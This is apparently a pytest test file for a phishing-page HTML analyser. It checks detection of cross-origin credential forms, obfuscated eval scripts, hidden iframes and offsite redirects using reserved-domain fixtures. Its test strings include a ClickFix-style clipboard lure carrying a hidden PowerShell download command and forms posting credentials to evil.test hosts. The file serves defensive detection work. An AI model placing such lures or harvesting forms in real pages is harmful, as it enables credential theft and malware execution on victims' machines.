"""Tests for uniphish.page.html (synthetic fixtures, reserved domains, offline)."""

from __future__ import annotations

from pathlib import Path

from hypothesis import given, settings
from hypothesis import strategies as st

from uniphish.page.html import parse_html

FIX = Path(__file__).parent / "fixtures"
BASE = "https://login.example.com/signin"


def test_credential_form_cross_origin() -> None:
    m = parse_html((FIX / "cred_form.html").read_text(), BASE)
    assert m.title == "Sign in to PayPal"
    assert m.lang == "en"
    assert m.meta.og_site_name == "PayPal"
    assert m.meta.theme_color == "#003087"
    assert len(m.forms) == 1
    f = m.forms[0]
    assert f.action == "https://collector.evil.test/post.php"
    assert f.method == "post"
    assert f.is_cross_origin and f.has_password and f.autocomplete_off
    assert f.has_hidden_credential  # otp_code; csrf_token is excluded
    assert f.input_names[:2] == ["email", "pass"]
    assert m.external_form_post
    assert m.password_input_count == 1 and m.password_field_present
    assert "collector.evil.test" in m.resource_hosts
    assert "cdn.assets.example" in m.resource_hosts
    assert m.external_link_hosts == ["other.example.org"]
    assert m.links[0].href == "https://login.example.com/help"
    assert m.links[1].target == "_blank"
    assert m.images[0].src == "https://login.example.com/logo.png"
    assert m.favicons == [("https://login.example.com/favicon.ico", "shortcut icon")]
    assert m.suspicious_comment_count == 1
    assert m.brand_text_hits.get("paypal", 0) >= 2
    assert "var x" not in m.visible_text and "enable js" not in m.visible_text
    assert "Log in to" in m.visible_text and m.text_len == len(m.visible_text)


def test_same_site_form_is_not_cross_origin() -> None:
    m = parse_html('<form action="/login" method=post><input type=password></form>', BASE)
    assert m.forms[0].action == "https://login.example.com/login"
    assert not m.forms[0].is_cross_origin and not m.external_form_post
    # subdomain of the same registrable domain is same-site
    m2 = parse_html('<form action="https://api.example.com/x"></form>', BASE)
    assert not m2.forms[0].is_cross_origin


def test_data_uri_form_action() -> None:
    m = parse_html('<form action="data:text/html;base64,PGgxPng8L2gxPg==" method="post">'
                   '<input type="password" name="p"></form>', BASE)
    f = m.forms[0]
    assert f.submits_to_data_uri
    assert f.action.startswith("data:")


def test_formaction_override_detected() -> None:
    m = parse_html('<form action="/ok"><input type=password>'
                   '<button formaction="https://drop.evil.test/c">Go</button></form>', BASE)
    assert m.forms[0].is_cross_origin
    assert m.external_form_post


def test_onsubmit_js_post() -> None:
    m = parse_html('<form onsubmit="fetch(\'https://x.evil.test\',{method:\'POST\'});return false">'
                   '<input type=password></form>', BASE)
    assert m.forms[0].submits_offsite_js
    m2 = parse_html('<form onsubmit="return validate()"><input></form>', BASE)
    assert not m2.forms[0].submits_offsite_js


def test_meta_refresh_to_other_host() -> None:
    m = parse_html(
        '<meta http-equiv="Refresh" content="0; URL=\'https://next.evil.test/a\'">', BASE)
    assert m.meta.refresh_delay == 0.0
    assert m.meta.refresh_target == "https://next.evil.test/a"
    assert m.meta_refresh_offsite


def test_meta_refresh_same_site_and_relative() -> None:
    m = parse_html('<meta http-equiv="refresh" content="5;url=/next">', BASE)
    assert m.meta.refresh_delay == 5.0
    assert m.meta.refresh_target == "https://login.example.com/next"
    assert not m.meta_refresh_offsite


def test_meta_refresh_without_url() -> None:
    m = parse_html('<meta http-equiv="refresh" content="30">', BASE)
    assert m.meta.refresh_delay == 30.0 and m.meta.refresh_target == ""
    assert not m.meta_refresh_offsite


def test_meta_csp_referrer_generator() -> None:
    m = parse_html('<meta http-equiv="Content-Security-Policy" content="default-src \'self\'">'
                   '<meta name="referrer" content="no-referrer">'
                   '<meta name="generator" content="Kit 1">')
    assert m.meta.csp == "default-src 'self'"
    assert m.meta.referrer == "no-referrer" and m.meta.generator == "Kit 1"


def test_obfuscated_inline_script() -> None:
    blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk="
    html = (f"<script>eval(atob('{blob}')); document.write(unescape('%41'));"
            f"String.fromCharCode(65);</script>"
            f'<script src="https://cdn.evil.test/k.js"></script>')
    m = parse_html(html, BASE)
    assert m.has_eval_like == 5
    assert m.inline_script_entropy.max_blob_len >= len(blob)
    assert m.inline_script_entropy.entropy > 4.5
    assert [s.is_external for s in m.scripts] == [False, True]
    assert m.scripts[1].host == "cdn.evil.test"
    assert m.scripts[0].inline_len > 50
    assert "cdn.evil.test" in m.resource_hosts


def test_plain_script_not_flagged() -> None:
    m = parse_html("<script>function f(){return 1}</script>", BASE)
    assert m.has_eval_like == 0 and m.inline_script_entropy.max_blob_len == 0


def test_clipboard_write_clickfix_indicator() -> None:
    cmd = 'powershell -w hidden -c "iwr hxxp://evil.test/a.ps1"'
    m = parse_html(f"<script>navigator.clipboard.writeText('{cmd}')</script>"
                   "<button onclick=\"document.execCommand('copy')\">I'm not a robot</button>")
    assert m.clipboard_write == 2


def test_hidden_iframe() -> None:
    m = parse_html('<iframe src="https://track.evil.test/f" style="display: none"></iframe>'
                   '<iframe src="/ok" width="0" height="0" sandbox="allow-scripts"></iframe>'
                   '<iframe src="/vis" width="600" height="400"></iframe>', BASE)
    assert [i.hidden for i in m.iframes] == [True, True, False]
    assert m.iframes[1].sandbox == "allow-scripts" and m.iframes[0].sandbox is None
    assert m.iframes[1].src == "https://login.example.com/ok"
    assert "track.evil.test" in m.resource_hosts


def test_base_href_is_honoured() -> None:
    m = parse_html('<base href="https://cdn.evil.test/"><a href="x">x</a>'
                   '<form action="post"></form>', BASE)
    assert m.base_href == "https://cdn.evil.test/"
    assert m.links[0].href == "https://cdn.evil.test/x"
    assert m.forms[0].is_cross_origin


def test_no_base_url_treats_absolute_as_external() -> None:
    m = parse_html('<form action="https://a.example.net/x"></form><a href="/rel">r</a>')
    assert m.forms[0].is_cross_origin
    assert m.links[0].href == "/rel"
    assert m.external_link_hosts == []


def test_broken_html_resilient() -> None:
    m = parse_html("<html><form action=x><input type=password<div><a href='http://a.example.org'"
                   "<<<>>><script>if(")
    assert m.parse_error == ""
    assert isinstance(m.forms, list)


def test_empty_and_non_str_inputs() -> None:
    assert parse_html("").text_len == 0
    assert parse_html("   ").forms == []
    assert parse_html(b"<title>t</title>").title == "t"  # type: ignore[arg-type]


def test_size_bound_and_caps(monkeypatch) -> None:
    import uniphish.page.html as h

    monkeypatch.setattr(h, "MAX_HTML_CHARS", 20_000)
    monkeypatch.setattr(h, "MAX_ITEMS", 50)
    m = parse_html("<a href='/x'>l</a>" * 2000 + "x" * 30_000, BASE)
    assert m.truncated
    assert len(m.links) <= 50


def test_tag_count_cap(monkeypatch) -> None:
    import uniphish.page.html as h

    monkeypatch.setattr(h, "MAX_TAGS", 100)
    m = parse_html("<p>a</p>" * 500, BASE)
    assert m.truncated and m.parse_error == ""


def test_deep_nesting_does_not_crash() -> None:
    m = parse_html("<div>" * 3_000 + "hello", BASE)
    assert m.parse_error == ""
    assert "hello" in m.visible_text


def test_weird_urls_do_not_raise() -> None:
    m = parse_html('<a href="http://[::1">a</a><a href="  jav\nascript:alert(1)">b</a>'
                   '<form action="http://exa mple.test:99999/"></form>', BASE)
    assert len(m.links) == 2
    assert m.links[1].href.lower().startswith("javascript:")


def test_brand_keywords_override_and_word_boundary() -> None:
    m = parse_html("<body>Apple pie and pineapple; ACME login</body>",
                   brand_keywords=["apple", "acme"])
    assert m.brand_text_hits == {"apple": 1, "acme": 1}


@settings(max_examples=60, deadline=None)
@given(st.text(max_size=400))
def test_never_raises_on_arbitrary_text(s: str) -> None:
    m = parse_html(s, BASE)
    assert m.text_len == len(m.visible_text)


@settings(max_examples=40, deadline=None)
@given(st.lists(st.sampled_from(
    ["<form action='", "<a href=\"", "<script>", "</script>", "<iframe src=",
     "<meta http-equiv=refresh content='", "<!--", "-->", "<input type=password>",
     "'>", "\">", "http://x.example/", "<", ">"]), max_size=40))
def test_never_raises_on_tag_soup(parts: list[str]) -> None:
    parse_html("".join(parts), BASE)
